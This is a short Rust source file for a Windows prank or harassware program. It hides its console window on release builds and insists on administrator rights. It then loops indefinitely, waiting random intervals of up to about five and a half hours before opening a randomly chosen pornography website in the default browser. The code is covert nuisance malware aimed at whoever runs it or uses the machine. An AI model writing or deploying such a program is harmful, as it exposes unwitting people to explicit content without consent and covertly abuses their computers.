// Prevents Windows from opening CMD
// Only on Release builds
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod elevation;

use error_stack::{IntoReport, Report, Result, ResultExt};
use rand::{thread_rng, Rng};
use std::{error::Error, fmt, thread, time::Duration};

// Create error struct
#[derive(Debug)]
pub struct RunTimeError;

impl fmt::Display for RunTimeError {
    fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {
        fmt.write_str("Error occurred during runtime")
    }
}

impl Error for RunTimeError {}

fn main() -> Result<(), RunTimeError> {
    // Ensure program is elevated
    if !elevation::is_elevated().change_context(RunTimeError)? {
        return Err(Report::new(elevation::ElevationError)
            .attach_printable("Program is not elevated")
            .change_context(RunTimeError));
    }

    let mut rng = thread_rng();

    let targets: [&str; 5] = [
        "https://pornhub.com",
        "https://pornhub.com/gayporn",
        "https://e621.net",
        "https://xvideos.com",
        "https://rule34.xxx",
    ];

    loop {
        // Sleep for 100s ~ 5:30h
        let delay = Duration::from_millis(rng.gen_range(100000..20000000));
        thread::sleep(delay);

        // Pick random site
        let target = targets[rng.gen_range(0..(targets.len() - 1))];

        // Open target in web browser
        webbrowser::open(target)
            .into_report()
            .attach_printable("Failed to open web browser")
            .change_context(RunTimeError)?;
    }
}
